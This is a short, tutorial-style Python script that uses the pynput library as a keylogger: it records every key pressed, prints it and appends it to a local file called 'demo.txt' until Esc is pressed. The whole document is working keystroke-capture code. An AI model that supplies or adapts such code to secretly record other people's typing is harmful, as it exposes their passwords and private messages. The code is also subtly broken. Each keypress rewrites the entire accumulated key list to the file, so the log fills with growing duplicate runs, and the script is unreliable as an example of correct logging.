# Import the necessary modules from the pynput library
from pynput.keyboard import Key, Listener

# Create an empty list to store pressed keys
k = []

# Define a function to be called when a key is pressed
def on_press(key):
    # Append the pressed key to the 'k' list
    k.append(key)
    # Call the 'write_1' function to write the pressed keys to a file
    write_1(k)
    # Print the pressed key to the console
    print(key)

# Define a function to write the pressed keys to a file
def write_1(var):
    # Open a file named "demo.txt" in append mode
    with open("demo.txt", "a") as f:
        # Iterate through the list of pressed keys
        for i in var:
            # Convert the key to a string and remove any single quotes
            new_var = str(i).replace("'", '')
            # Write the key to the file followed by a space
            f.write(new_var)
            f.write(" ")

# Define a function to be called when a key is released
def on_release(key):
    # If the pressed key is the 'esc' key, exit the program
    if key == Key.esc:
        return False

# Set up a listener to monitor key presses and releases
with Listener(on_press=on_press, on_release=on_release) as l:
    # Start listening for key events
    l.join()
